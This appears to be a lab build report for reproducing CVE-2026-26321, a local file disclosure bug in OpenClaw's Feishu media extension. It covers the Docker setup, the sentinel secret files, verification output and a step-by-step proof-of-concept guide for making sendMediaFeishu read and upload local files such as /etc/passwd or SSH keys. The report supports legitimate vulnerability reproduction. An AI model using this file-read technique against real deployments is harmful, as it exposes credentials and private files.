# Lab Build Report: CVE-2026-26321

## Lab Architecture

**Single-container lab** — No external services (database, cache, etc.) are required. The vulnerability is a path traversal / local file disclosure in OpenClaw's Feishu extension (`extensions/feishu/src/media.ts`). It only requires a Node.js environment with the vulnerable source code and its dependencies installed.

### Container Topology

| Container | Role | Image |
|---|---|---|
| `cve-2026-26321-vulnerable` | Vulnerable OpenClaw v2026.2.13 | `lab-vulnerable` (built from `Dockerfile.vulnerable`) |

### Why Single Container

The vulnerability is in application-level TypeScript code (`isLocalPath()` + `fs.readFileSync()`) and requires no databases, caches, or external services. The PoC triggers the vulnerable function directly via vitest (the project's test framework) with mocked Feishu API dependencies.

## Container Details

### cve-2026-26321-vulnerable

| Field | Value |
|---|---|
| **Container Name** | `cve-2026-26321-vulnerable` |
| **Base Image** | `node:22-bookworm` (matches project's own Dockerfile) |
| **Node.js Version** | v22.22.0 |
| **pnpm Version** | 10.23.0 |
| **OpenClaw Version** | v2026.2.13 (vulnerable) |
| **Working Directory** | `/app` |
| **Networks** | `lab-net` |
| **Ports** | None (no running server needed) |

### Source Code Location

- Full monorepo: `/app/`
- Vulnerable file: `/app/extensions/feishu/src/media.ts`
- Existing test file: `/app/extensions/feishu/src/media.test.ts`
- Vitest config: `/app/vitest.extensions.config.ts`

### Sentinel Files for PoC

| Path | Content | Purpose |
|---|---|---|
| `/tmp/cve-secret.txt` | `CVE-2026-26321-SECRET-DATA-EXFILTRATED` | Primary PoC target |
| `/tmp/fake-passwd` | `root:x:0:0:root:/root:/bin/bash` | Simulated /etc/passwd |
| `/tmp/fake-env` | `OPENCLAW_API_KEY=sk-secret-key-12345` | Simulated leaked credentials |
| `/tmp/fake-ssh-key` | RSA private key (fake) | Simulated SSH key exfiltration |
| `/etc/passwd` | Real system passwd file | Demonstrates real file read |

## Build Status

| Step | Status | Notes |
|---|---|---|
| Docker image build | ✅ SUCCESS | Built from `node:22-bookworm` base |
| `pnpm install` | ✅ SUCCESS | All 1006 packages installed (including native deps: sharp, esbuild, protobufjs) |
| Container startup | ✅ SUCCESS | Running with `tail -f /dev/null` |
| Verification script | ✅ SUCCESS | All 8 isLocalPath() tests pass, file read demonstrated |
| Vitest infrastructure | ✅ SUCCESS | 4/4 existing media.test.ts tests pass |

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Stop lab
docker compose down

# Pull latest image
docker compose pull
docker compose up -d
```

## Verification Evidence

### Vulnerability Verification Script Output

```
=== CVE-2026-26321 Vulnerability Verification ===

[1] Checking vulnerable source file...
  OK: media.ts found at /app/extensions/feishu/src/media.ts

[2] Checking vulnerable code patterns...
  isLocalPath() function:  PRESENT (vulnerable)
  fs.readFileSync():       PRESENT (vulnerable)
  Bare fetch(mediaUrl):    PRESENT (SSRF-vulnerable)

[3] Testing isLocalPath() classification...
  [PASS] isLocalPath("/etc/passwd") = true  (Unix absolute path)
  [PASS] isLocalPath("/tmp/cve-secret.txt") = true  (Sentinel file path)
  [PASS] isLocalPath("~/.ssh/id_rsa") = true  (Home-relative path)
  [PASS] isLocalPath("file:///etc/shadow") = true  (file:// protocol)
  [PASS] isLocalPath("C:\Windows\System32") = true  (Windows drive letter)
  [PASS] isLocalPath("not-a-valid-url") = true  (Invalid URL (falls through))
  [PASS] isLocalPath("http://example.com/img.png") = false  (HTTP URL (remote))
  [PASS] isLocalPath("https://example.com/f.pdf") = false  (HTTPS URL (remote))

[4] Demonstrating arbitrary file read...
  File read successful: /tmp/cve-secret.txt
  Content (39 bytes): "CVE-2026-26321-SECRET-DATA-EXFILTRATED"
  --> This is exactly what sendMediaFeishu() does with user-controlled mediaUrl

  /etc/passwd read successful (first line): "root:x:0:0:root:/root:/bin/bash"

=== Verification Summary ===
RESULT: VULNERABLE — CVE-2026-26321 is exploitable in this build
```

### Vitest Results

```
✓ extensions/feishu/src/media.test.ts (4 tests) 4ms

 Test Files  1 passed (1)
      Tests  4 passed (4)
   Duration  925ms
```

## PoC Execution Guide

The PoC agent should write a vitest test file (e.g., `/app/extensions/feishu/src/cve-2026-26321-poc.test.ts`) following the pattern in the existing `media.test.ts`:

1. **Mock dependencies** using `vi.mock()`:
   - `./client.js` → `createFeishuClient` (return mock client with upload/send mocks)
   - `./accounts.js` → `resolveFeishuAccount` (return `{ configured: true, ... }`)
   - `./targets.js` → `normalizeFeishuTarget`, `resolveReceiveIdType`

2. **Import** `sendMediaFeishu` from `./media.js`

3. **Call** `sendMediaFeishu({ cfg: {}, to: "user:target", mediaUrl: "/tmp/cve-secret.txt" })`

4. **Assert** that the upload mock receives a Buffer containing `"CVE-2026-26321-SECRET-DATA-EXFILTRATED"`

5. **Run** with: `docker exec cve-2026-26321-vulnerable npx vitest run extensions/feishu/src/cve-2026-26321-poc.test.ts --config vitest.extensions.config.ts`

### Alternative: Standalone verification

```bash
docker exec cve-2026-26321-vulnerable node /app/verify-vuln.mjs
```

## Known Issues

- **None** — The lab builds and runs cleanly. All dependencies install successfully. The vitest test infrastructure works. The vulnerable code is confirmed present and exploitable.

## Lab Artifacts

| File | Path | Description |
|---|---|---|
| Dockerfile | `Dockerfile.vulnerable` | Vulnerable container Dockerfile |
| Compose file | `docker-compose.yml` | Docker Compose orchestration |
| Verification script | `verify-vuln.mjs` | Standalone vulnerability check |
